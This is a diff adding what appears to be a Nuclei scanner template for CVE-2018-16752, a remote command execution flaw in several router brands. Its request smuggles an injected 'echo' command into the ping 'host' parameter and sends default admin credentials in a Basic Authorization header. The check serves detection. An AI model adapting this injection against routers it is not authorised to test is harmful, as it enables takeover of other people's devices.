@@ -1,0 +1,26 @@
+id: cve-2018-16752
+info:
+  name: Multiple Router Models RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Many routers such as JCG, LINKNET, and VINGA execute commands in the background. Hackers can execute arbitrary commands on the server and write into the backdoor, thus invading the server and gaining the administrator's authority of the server.
+  tags: rce, router
+variables:
+  rand_str: '{{rand_base(8)}}'
+http:
+  - raw:
+      - |
+        GET /goform/sysTools?tool=0&pingCount=4&host=127.0.0.1;echo%20{{rand_str}}{{rand_str}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{rand_str}}{{rand_str}}'
+        part: body
